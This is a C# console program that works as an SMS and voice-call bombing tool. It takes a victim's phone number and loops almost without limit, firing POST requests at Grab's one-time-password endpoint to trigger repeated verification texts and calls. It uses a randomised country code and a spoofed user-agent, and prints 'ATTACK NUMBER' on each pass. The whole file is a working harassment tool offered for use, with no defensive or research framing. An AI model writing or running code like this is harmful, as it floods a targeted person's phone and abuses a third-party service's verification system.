using System;
using System.Collections.Generic;
using System.IO;
using System.Net.WebSockets;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace ConsoleApp18
{
    class Program
    {
        private static int int_0;

        static void Main(string[] args)
        {
            WebClient webClient = new WebClient();
            {
                Console.Title = ("");
                Random random = new Random();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("CopyRight 2019 | FewHakko");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("-------------------------");
                Console.Write("Phone => ");
                string fewza = Console.ReadLine();
                //Console.Write("Requests => ");
                //string fewz2a = Console.ReadLine();
                Console.WriteLine("=========================");
                Console.ForegroundColor = ConsoleColor.White;
                //Program.int_0 = int.Parse(fewz2a.Trim());
                int check = 1;

                

                while (check <= 999999999)
                {
                    try
                    {
                        string[] numbers = new string[8] { "MY", "SG", "ID", "TH", "VN", "KH", "PH", "MM" };
                        Random random1 = new Random();
                        int num = random1.Next(0, 8);
                        string text = numbers[num];
                        Program.text = text;
                        string date = DateTime.Now.ToLongTimeString();
                        Console.WriteLine($"{date} || [{Program.sfew++}] | ATTACK NUMBER => {fewza} | Country => {text}");
                        webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; " + "Windows NT 5.2; .NET CLR 1.0.3705;)");
                        fewfew = webClient.UploadString($"https://api.grab.com/grabid/v1/phone/otp?method=SMS&countryCode=TH&phoneNumber={fewza}&templateID=&numDigits=5", "POST");
                        few2few = webClient.UploadString($"https://api.grab.com/grabid/v1/phone/otp?method=CALL&countryCode={text}&phoneNumber={fewza}&templateID=&numDigits=5", "POST");
                        check = check + 1;
                        System.Threading.Thread.Sleep(1000);
                    }
                    catch
                    {
                        System.Threading.Thread.Sleep(1000);
                    }
                }
                Console.ReadKey();
            }
        }

        private static int sfew = 1;
        public static string text;
        public static string fewza;
        public static string fewfew;
        public static string few2few;

    }

}